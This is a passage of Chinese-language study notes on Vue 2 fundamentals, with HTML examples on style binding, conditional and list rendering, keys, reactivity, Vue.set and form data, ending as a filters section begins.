      <!-- 绑定class样式 -- 对象写法, 适用于: 要绑定的样式个数确定, 名字也确定, 但要动态决定用不用 -->
             
      <div class="basic" :class="classObj">{{name}}</div>
      <br /><br />
             
      <div class="basic" :class="{atguigu1: true, atguigu2: true}">
        {{name}}
      </div>
      <br /><br />

             
      <div class="basic" :style="{fontSize: fsize+'px'}">{{name}}</div>
      <br /><br />

             
      <!-- 绑定style样式 -- 对象写法 -->
             
      <div class="basic" :style="styleObj">{{name}}</div>
      <br /><br />

             
      <!-- 绑定style样式 -- 数组写法 -->
             
      <!-- 数据写法很少 -->
             
      <div class="basic" :style="[styleObj, styleObj2]">{{name}}</div>
      <br /><br />
             
      <div class="basic" :style="styleArr">{{name}}</div>
      <br /><br />
         
    </div>

       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
          mood: "normal",
          classArr: ["atguigu1", "atguigu2", "atguigu3"],
          classObj: {
            atguigu1: true,
            atguigu2: true,
          },
          fsize: 40,
          styleObj: {
            fontSize: "40px",
            color: "red",
          },
          styleObj2: {
            backgroundColor: "orange",
          },
          styleArr: [
            {
              fontSize: "40px",
              color: "blue",
            },
            {
              backgroundColor: "gray",
            },
          ],
        },
        methods: {
          changeMood() {
            /*    console.log(parseInt(Math.random()*3));
                       let rand = parseInt(Math.random()*3)
                       if (rand == 0) {
                           this.mood = 'happy'
                       }
                       if (rand == 1) {
                           this.mood = 'sad'
                       }
                       if (rand == 2) {
                           this.mood = 'normal'
                       } */
            const arr = ["happy", "sad", "normal"];
            const index = Math.floor(Math.random() * 3);
            this.mood = arr[index];
          },
        },
      });
    </script>
  </body>
</html>
```

## 条件渲染

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>条件渲染</title>
       
    <script src="../js/vue.js"></script>
  </head>
  <body>
           
    <!-- 
                条件渲染：
                            1.v-if
                                        写法：
                                                (1).v-if="表达式" 
                                                (2).v-else-if="表达式"
                                                (3).v-else="表达式"
                                        适用于：切换频率较低的场景。
                                        特点：不展示的DOM元素直接被移除。
                                        注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。


                            2.v-show
                                        写法：v-show="表达式"
                                        适用于：切换频率较高的场景。
                                        特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
                                
                            3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
         -->
       
    <div id="root">
             
      <h2>当前的n值是:{{n}}</h2>
              <button @click="n++">点我n+1</button>        
      <!-- 使用v-show做条件渲染 -->
             
      <!-- <h2 v-show="true">欢迎来到{{name}}</h2> -->
             
      <!-- <h2 v-show="a">欢迎来到{{name}}</h2> -->
             
      <!-- <h2 v-show="1 === 3">欢迎来到{{name}}</h2> -->

             
      <!-- 使用v-show做条件渲染  -->
             
      <!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->
             
      <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->

             
      <!-- v-else和v-else-if -->
             
      <!-- 中间的div不允许被打断 -->
             
      <!-- <div v-if="n === 1">Angular</div> -->
             
      <!-- <div v-else-if="n === 2">React</div> -->
             
      <!-- <div v-else-if="n === 3">Vue</div> -->
             
      <!-- <div v-else>哈哈</div> -->

             
      <!-- v-if和template的配合使用 -->
             
      <!-- template标签内部只能跟v-if一起配合使用, 不能跟v-show -->
             
      <template v-if="n === 1">
                   
        <h2>你好</h2>
                   
        <h2>尚硅谷</h2>
                   
        <h2>北京</h2>
               
      </template>

         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
          a: false,
          n: 0,
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

## 列表渲染

基本列表

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>基本列表</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                v-for指令:
                        1.用于展示列表数据
                        2.语法：v-for="(item, index) in xxx" :key="yyy"
                        3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
        -->
       
    <div id="root">
             
      <!-- 遍历数组 -->
             
      <h2>人员列表(遍历数组)</h2>
             
      <ul>
                   
        <!-- 两个参数也可以不加小括号(), 但是最好养成一个好的习惯 -->
                   
        <!-- <li v-for="person,index in persons" :key="index"></li> -->
                   
        <!-- 也可以使用of来遍历, 接近 JavaScript 迭代器的语法 -->
                   
        <!-- <li v-for="(person,index) of persons" :key="index"></li> -->
                   
        <li v-for="(person,index) in persons" :key="index">
                          {{index}} - {{person.name}} - {{person.id}}          
           
        </li>
               
      </ul>

             
      <!-- 遍历对象 -->
             
      <h2>汽车信息(遍历对象)</h2>
             
      <ul>
                   
        <li v-for="(value,key) in car" ::key="key">
                          {{key}} -- {{value}}            
        </li>
               
      </ul>
                     
      <!-- 遍历字符串 -->
             
      <h2>遍历字符串(用得少)</h2>
             
      <ul>
                   
        <li v-for="(char,index) in str" ::key="index">
                          {{index}} -- {{char}}            
        </li>
               
      </ul>
                     
      <!-- 遍历指定次数 -->
             
      <h2>遍历指定次数(用得少)</h2>
             
      <ul>
                   
        <li v-for="(number,index) in 5" ::key="index">
                          {{number}} -- {{index}}            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          persons: [
            { id: "001", name: "张三", age: 18 },
            { id: "002", name: "李四", age: 19 },
            { id: "003", name: "王五", age: 20 },
          ],
          car: {
            name: "奥迪A8",
            price: "70万",
            color: "黑色",
          },
          str: "hello",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

key 的原理
开发中如何选择 key?: 1.最好使用每条数据的唯一标识作为 key, 比如 id、手机号、身份证号、学号等唯一值。 2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用 index 作为 key 是没有问题的。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>key的原理</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                面试题：react、vue中的key有什么作用？（key的内部原理）
                        
                        1. 虚拟DOM中key的作用：
                                        key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                                        随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                                        
                        2.对比规则：
                                    (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                                                ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                                                ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。


                                    (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                                                创建新的真实DOM，随后渲染到到页面。
                                                
                        3. 用index作为key可能会引发的问题：
                                            1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                                                            会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。


                                            2. 如果结构中还包含输入类的DOM：
                                                            会产生错误DOM更新 ==> 界面有问题。


                        4. 开发中如何选择key?:
                                            1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                                            2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                                                使用index作为key是没有问题的。
        -->
       
    <div id="root">
             
      <!-- 遍历数组 -->
             
      <h2>人员列表(遍历数组)</h2>
              <button @click="add">添加一个老刘</button>        
      <ul>
                   
        <li v-for="(person,index) in persons" :key="person.id">
                          {{person.name}} - {{person.id}}
          <input type="text" />            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          persons: [
            { id: "001", name: "张三", age: 18 },
            { id: "002", name: "李四", age: 19 },
            { id: "003", name: "王五", age: 20 },
          ],
        },
        methods: {
          add() {
            this.persons.unshift({ id: "004", name: "老刘", age: 40 });
          },
        },
      });
    </script>
  </body>
</html>
```

![](https://cdn.xiamu.icu//FvndVbk8QcXbm5WQfmIAwM9RHDnA.png)
![](https://cdn.xiamu.icu//FjdbeZ3yMnWRT3Q8WquMC_mPz-Wu.png)

## 监视数据的原理

监测数据的原理就是监测 set 被调用监测的, 一旦 set 被调用, 就会被监测到

![](https://cdn.xiamu.icu//FgHfvU2dLxl5hH8ah8xUA9HXIySU.png)
![](https://cdn.xiamu.icu//Fu4DQlMOWpmwRulYpiez5Y5zWcee.png)
因为 vm.student === vm.\_data.student , 所以上面的代码可以简写
![](https://cdn.xiamu.icu//FpsAmhp7QDUOrVrOH141OdpbTVvi.png)
![](https://cdn.xiamu.icu//FmAe94iutK9tZkmQjKUzCmdpQJ8F.png)
注意, 这种方式只能给 vm 中的某一个对象追加属性, 不能给 data 追加一个属性
![](https://cdn.xiamu.icu//FkKNuDplkfonq-FkH1s9lVBfW7Ln.png)

![](https://cdn.xiamu.icu//FlEyJyZmqK1C8HuzYEiqcFze3SQR.png)

![](https://cdn.xiamu.icu//FjHDyckS-FbvMDlOjl2r9xNeFykV.png)
只用着了这七个方法, vue 会发现修改了数组
下面这种方法, 修改数组, vue 也会发现, 然后渲染页面
![](https://cdn.xiamu.icu//Fv0-H4bK9jhOhepkOuZt57foJ5FY.png)

数组里面不能够使用 getset 来监视, 尽管修改了数组索引的值, 但是页面并没有发生改变
![](https://cdn.xiamu.icu//FpoigAWQViUCrjG4rikXwt_132y8.png)
使用了 push 的方式修改了数组, 但是页面发生了变化
![](https://cdn.xiamu.icu//Flv_U3B_lTrJhiAvKjQVTxi7ao5F.png)
使用了这七个方法中的修改了数组, 都是响应式的, 页面都会有反应的

## 列表渲染

基本列表

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>基本列表</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                v-for指令:
                        1.用于展示列表数据
                        2.语法：v-for="(item, index) in xxx" :key="yyy"
                        3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
        -->
       
    <div id="root">
             
      <!-- 遍历数组 -->
             
      <h2>人员列表(遍历数组)</h2>
             
      <ul>
                   
        <!-- 两个参数也可以不加小括号(), 但是最好养成一个好的习惯 -->
                   
        <!-- <li v-for="person,index in persons" :key="index"></li> -->
                   
        <!-- 也可以使用of来遍历, 接近 JavaScript 迭代器的语法 -->
                   
        <!-- <li v-for="(person,index) of persons" :key="index"></li> -->
                   
        <li v-for="(person,index) in persons" :key="index">
                          {{index}} - {{person.name}} - {{person.id}}          
           
        </li>
               
      </ul>

             
      <!-- 遍历对象 -->
             
      <h2>汽车信息(遍历对象)</h2>
             
      <ul>
                   
        <li v-for="(value,key) in car" ::key="key">
                          {{key}} -- {{value}}            
        </li>
               
      </ul>
                     
      <!-- 遍历字符串 -->
             
      <h2>遍历字符串(用得少)</h2>
             
      <ul>
                   
        <li v-for="(char,index) in str" ::key="index">
                          {{index}} -- {{char}}            
        </li>
               
      </ul>
                     
      <!-- 遍历指定次数 -->
             
      <h2>遍历指定次数(用得少)</h2>
             
      <ul>
                   
        <li v-for="(number,index) in 5" ::key="index">
                          {{number}} -- {{index}}            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          persons: [
            { id: "001", name: "张三", age: 18 },
            { id: "002", name: "李四", age: 19 },
            { id: "003", name: "王五", age: 20 },
          ],
          car: {
            name: "奥迪A8",
            price: "70万",
            color: "黑色",
          },
          str: "hello",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

key 的原理

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>key的原理</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                面试题：react、vue中的key有什么作用？（key的内部原理）
                        
                        1. 虚拟DOM中key的作用：
                                        key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                                        随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                                        
                        2.对比规则：
                                    (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                                                ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                                                ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。


                                    (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                                                创建新的真实DOM，随后渲染到到页面。
                                                
                        3. 用index作为key可能会引发的问题：
                                            1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                                                            会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。


                                            2. 如果结构中还包含输入类的DOM：
                                                            会产生错误DOM更新 ==> 界面有问题。


                        4. 开发中如何选择key?:
                                            1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                                            2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                                                使用index作为key是没有问题的。
        -->
       
    <div id="root">
             
      <!-- 遍历数组 -->
             
      <h2>人员列表(遍历数组)</h2>
              <button @click="add">添加一个老刘</button>        
      <ul>
                   
        <li v-for="(person,index) in persons" :key="person.id">
                          {{person.name}} - {{person.id}}
          <input type="text" />            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          persons: [
            { id: "001", name: "张三", age: 18 },
            { id: "002", name: "李四", age: 19 },
            { id: "003", name: "王五", age: 20 },
          ],
        },
        methods: {
          add() {
            this.persons.unshift({ id: "004", name: "老刘", age: 40 });
          },
        },
      });
    </script>
  </body>
</html>
```

列表过滤

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>列表过滤</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>人员列表</h2>
              <input type="text" placeholder="请输入名字" v-model="keyWord" />  
           
      <ul>
                   
        <li v-for="(person,index) in filPersons" :key="index">
                          {{person.name}} - {{person.id}} - {{person.sex}}      
               
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false; /* const vm = new Vue({ // 用watch实现
            el: '#root',
            data: {
                keyWord: '',
                persons: [
                    { id: '001', name: '马冬梅', age: 18, sex: '女' },
                    { id: '002', name: '周冬雨', age: 19, sex: '女' },
                    { id: '003', name: '周杰伦', age: 20, sex: '男' },
                    { id: '004', name: '温兆伦', age: 20, sex: '男' }
                ],
                filPersons: []
            },
            methods: {


            },
            watch: {
                keyWord: {
                    immediate: true,
                    handler(val) {
                        this.filPersons = this.persons.filter((p) => {
                            return p.name.indexOf(val) !== -1
                        })
                    }
                }


            } 
        })*/ // 用computed实现
      const vm = new Vue({
        el: "#root",
        data: {
          keyWord: "",
          persons: [
            { id: "001", name: "马冬梅", age: 18, sex: "女" },
            { id: "002", name: "周冬雨", age: 19, sex: "女" },
            { id: "003", name: "周杰伦", age: 20, sex: "男" },
            { id: "004", name: "温兆伦", age: 20, sex: "男" },
          ],
        },
        computed: {
          filPersons() {
            return this.persons.filter((p) => {
              return p.name.indexOf(this.keyWord) !== -1;
            });
          },
        },
      });
    </script>
  </body>
</html>
```

列表排序

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>列表排序</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>人员列表</h2>
              <input type="text" placeholder="请输入名字" v-model="keyWord" />  
            <button @click="sortType = 2">年龄升序</button>        
      <button @click="sortType = 1">年龄降序</button>        
      <button @click="sortType = 0">原顺序</button>        
      <ul>
                   
        <li v-for="(person,index) in filPersons" :key="person.id">
                          {{person.name}} - {{person.age}} - {{person.sex}}    
                      <input type="text" />            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          keyWord: "",
          persons: [
            { id: "001", name: "马冬梅", age: 33, sex: "女" },
            { id: "002", name: "周冬雨", age: 30, sex: "女" },
            { id: "003", name: "周杰伦", age: 18, sex: "男" },
            { id: "004", name: "温兆伦", age: 20, sex: "男" },
          ],
          sortType: 0, // 0原顺序  1 降序  2 升序
        },
        computed: {
          filPersons() {
            const arr = this.persons.filter((p) => {
              return p.name.indexOf(this.keyWord) !== -1;
            });

            if (this.sortType) {
              arr.sort((p1, p2) => {
                return this.sortType == 1 ? p2.age - p1.age : p1.age - p2.age;
              });
            }

            return arr;
          },
        },
      });
    </script>
  </body>
</html>
```

更新时的一个问题

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>列表排序</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>人员列表</h2>
              <button @click="updateMei">点我修改马冬梅</button>        
      <ul>
                   
        <li v-for="(person,index) in persons" :key="person.id">
                          {{person.name}} - {{person.age}} - {{person.sex}}    
                 
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          persons: [
            { id: "001", name: "马冬梅", age: 33, sex: "女" },
            { id: "002", name: "周冬雨", age: 30, sex: "女" },
            { id: "003", name: "周杰伦", age: 18, sex: "男" },
            { id: "004", name: "温兆伦", age: 20, sex: "男" },
          ],
        },
        methods: {
          updateMei() {
            // this.persons[0].name = '马老师'    // 奏效
            // this.persons[0].age = 50          // 奏效
            // this.persons[0].sex = '男'        // 奏效
            this.persons[0] = { id: "001", name: "马老师", age: 50, sex: "男" };
          },
        },
      });
    </script>
  </body>
</html>
```

Vue 检测数据改变的原理

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>Vue检测数据改变的原理</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>学校名称: {{name}}</h2>
             
      <h2>学校地址: {{address}}</h2>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
          address: "北京",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

模拟一个数据检测

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>模拟一个数据检测</title>
  </head>
  <body>
       
    <script>
      let data = {
        name: "尚硅谷",
        address: "北京",
      }; // let tmp = '尚硅谷' // setInterval(() => { //     if (data.name !== tmp) { //         tmp = data.name //         console.log('name被改了'); //     } // }) // Object.defineProperty(data, 'name', { //     get() { //         return data.name //     }, //     set(val) { //         data.name = val //     } // }) // 创建一个监视的实例对象, 用于监视data中属性的变化

      const obs = new Observer(data);
      console.log(obs); // 准备一个vm实例对象

      let vm = {};
      vm._data = data = obs; // 创建一个监视实例对象

      function Observer(obj) {
        // 汇总对象中的所有属性形成一个数组
        const keys = Object.keys(obj);
        console.log(keys);
        keys.forEach((k) => {
          Object.defineProperty(this, k, {
            get() {
              return obj[k];
            },
            set(val) {
              console.log(
                `${k}被改了被改了, 我要去解析模板, 生成虚拟DOM.....我要开始忙了`
              );
              obj[k] = val;
            },
          });
        });
      }
    </script>
  </body>
</html>
```

Vue.set 的使用

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>Vue检测数据改变的原理</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>学校名称: {{school.name}}</h2>
             
      <h2>学校地址: {{school.address}}</h2>
             
      <h2>校长: {{school.leader}}</h2>
             
      <hr />
              <button @click="addSex">点我添加一个性别: 性别为男</button>      
       
      <h2>姓名: {{student.name}}</h2>
             
      <h2>年龄: {{student.age.rAge}}, {{student.age.sAge}}</h2>
             
      <h2 v-if="student.sex">性别: {{student.sex}}</h2>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          school: {
            name: "尚硅谷",
            address: "北京",
          },
          student: {
            name: "tom",
            age: {
              rAge: 40,
              sAge: 29,
            },
            friends: [
              { name: "jerry", age: 35 },
              { name: "tony", age: 36 },
            ],
          },
        },
        methods: {
          addSex() {
            this.$set(this.student, "sex", "男");
          },
        },
      });
    </script>
  </body>
</html>
```

Vue 检测数据改变的原理\_数组

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>Vue检测数据改变的原理_数组</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>学校名称: {{school.name}}</h2>
             
      <h2>学校地址: {{school.address}}</h2>
             
      <h2>校长: {{school.leader}}</h2>
             
      <hr />
              <button @click="addSex">点我添加一个性别: 性别为男</button>      
       
      <h2>姓名: {{student.name}}</h2>
             
      <h2>年龄: {{student.age.rAge}}, {{student.age.sAge}}</h2>
             
      <h2 v-if="student.sex">性别: {{student.sex}}</h2>

             
      <h2>爱好</h2>
               
      <ul>
                   
        <li v-for="(h,index) in student.hobby" :key="index">
                          {{h}}            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          school: {
            name: "尚硅谷",
            address: "北京",
          },
          student: {
            name: "tom",
            age: {
              rAge: 40,
              sAge: 29,
            },
            hobby: ["抽烟", "喝酒", "烫头"],
            friends: [
              { name: "jerry", age: 35 },
              { name: "tony", age: 36 },
            ],
          },
        },
        methods: {
          addSex() {
            this.$set(this.student, "sex", "男");
          },
        },
      });
    </script>
  </body>
</html>
```

总结 Vue 数据监测

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>总结Vue数据监测</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!--
            Vue监视数据的原理：
                1. vue会监视data中所有层次的数据。


                2. 如何监测对象中的数据？
                                通过setter实现监视，且要在new Vue时就传入要监测的数据。
                                    (1).对象中后追加的属性，Vue默认不做响应式处理
                                    (2).如需给后添加的属性做响应式，请使用如下API：
                                                    Vue.set(target，propertyName/index，value) 或 
                                                    vm.$set(target，propertyName/index，value)


                3. 如何监测数组中的数据？
                                    通过包裹数组更新元素的方法实现，本质就是做了两件事：
                                        (1).调用原生对应的方法对数组进行更新。
                                        (2).重新解析模板，进而更新页面。


                4.在Vue修改数组中的某个元素一定要用如下方法：
                            1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
                            2.Vue.set() 或 vm.$set()
                
                特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
        -->
       
    <div id="root">
             
      <h2>学生信息</h2>

              <button @click="student.age++">年龄+1岁</button>

              <button @click="addSex">添加性别属性，默认值：男</button>

              <button @click="updateSex">修改性别</button>

              <button @click="addFriends">在列表首位添加一个朋友</button>

             
      <button @click="updateFriends">修改第一个朋友的名字为：张三</button>

              <button @click="addHobby">添加一个爱好</button>

              <button @click="updateHobby">修改第一个爱好为：开车</button>

              <button @click="deleteHobby">过滤掉爱好中的抽烟</button>

             
      <h2>姓名: {{student.name}}</h2>
             
      <h2>年龄: {{student.age}}</h2>
             
      <h2 v-if="student.sex">性别: {{student.sex}}</h2>
             
      <h2>爱好</h2>
             
      <ul>
                   
        <li v-for="(h,index) in student.hobby" :key="index">
                          {{h}}            
        </li>
               
      </ul>
             
      <h2>朋友们</h2>
             
      <ul>
                   
        <li v-for="(f,index) in student.friends" :key="index">
                          {{f.name}} -- {{f.age}}            
        </li>
               
      </ul>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          student: {
            name: "tom",
            age: 18,
            hobby: ["抽烟", "喝酒", "烫头"],
            friends: [
              { name: "jerry", age: 35 },
              { name: "tony", age: 36 },
            ],
          },
        },
        methods: {
          addSex() {
            this.$set(this.student, "sex", "男");
          },
          updateSex() {
            this.student.sex = "未知";
            /*                     if (this.student.sex === '男') {
                        this.$set(this.student, 'sex', '女')
                    } else {
                        this.$set(this.student, 'sex', '男')
                    } */
          },
          addFriends() {
            // vm.student.friends.unshift({name: '肉豆蔻', age: 18})
            this.student.friends.unshift({ name: "肉豆蔻", age: 18 });
          },
          updateFriends() {
            // vm.student.friends[0].name = '张三'
            this.student.friends[0].name = "张三";
          },
          addHobby() {
            // vm.student.hobby.push('学习')
            this.student.hobby.push("学习");
          },
          updateHobby() {
            // vm.$set(vm.student.hobby, 0, '开车')
            this.student.hobby.splice(0, 1, "开车"); // this.$set(this.student.hobby, 0, '开车')
          },
          deleteHobby() {
            // vm.student.hobby.filter(h => h.indexOf('抽烟'))
            // filter是浅拷贝

            // this.student.hobby = this.student.hobby.filter(h => h.indexOf('抽烟'))

            this.student.hobby = this.student.hobby.filter((h) => {
              return h !== "抽烟";
            });
          },
        },
      }); /*
        filter是浅拷贝
        
        const words = ['spray', 'limit', 'elite', 'exuberant', 'destruction', 'present'];


        const result = words.filter(word => word.length > 6);


        console.log(result);
        */
    </script>
  </body>
</html>
```

## 收集表单数据

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>收集表单数据</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
            收集表单数据：
                    若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
                    若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
                    若：<input type="checkbox"/>
                            1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                            2.配置input的value属性:
                                    (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                                    (2)v-model的初始值是数组，那么收集的的就是value组成的数组
                    备注：v-model的三个修饰符：
                                    lazy：失去焦点再收集数据
                                    number：输入字符串转为有效的数字
                                    trim：输入首尾空格过滤
        -->
       
    <div id="root">
             
      <form @submit.prevent="demo">
                    账号:
        <input
          type="text"
          v-model.trim="userInfo.account"
          autofocus
        /><br /><br />
                    密码:
        <input type="password" v-model="userInfo.password" /><br /><br />
                    年龄:
        <input type="number" v-model.number="userInfo.age" /><br /><br />
                    性别:             男<input
          type="radio"
          name="sex"
          value="male"
          v-model="userInfo.sex"
        />
                    女<input
          type="radio"
          name="sex"
          value="female"
          v-model="userInfo.sex"
        /><br /><br />
                    爱好:             抽烟<input
          type="checkbox"
          name="hobby"
          value="抽烟"
          v-model="userInfo.hobby"
        />
                    喝酒<input
          type="checkbox"
          name="hobby"
          value="喝酒"
          v-model="userInfo.hobby"
        />
                    烫头<input
          type="checkbox"
          name="hobby"
          value="烫头"
          v-model="userInfo.hobby"
        /><br /><br />
                    所属校区            
        <select v-model="userInfo.city">
                         
          <option value="">请选择校区</option>
                         
          <option value="beijing">北京</option>
                         
          <option value="shanghai">上海</option>
                         
          <option value="shenzhen">深圳</option>
                         
          <option value="wuhan">武汉</option>
                     
        </select>
                    <br /><br />
                    其他信息:            
        <textarea v-model.lazy="userInfo.other"></textarea>            
        <br /><br />
                    <input type="checkbox" v-model="userInfo.agree" />          
          阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>          
          <br /><br />
                    <button>提交</button>        
      </form>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          userInfo: {
            account: "",
            password: "",
            age: 18,
            sex: "female",
            hobby: [],
            city: "beijing",
            other: "",
            agree: "",
          },
        },
        methods: {
          demo() {
            console.log(JSON.stringify(this.userInfo));
          },
        },
      });
    </script>
  </body>
</html>
```

## 过滤器

在[https://www.bootcdn.cn/](https://www.bootcdn.cn/)网站中找到 dayjs.min.js 并且引入

```html
<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>过滤器</title>
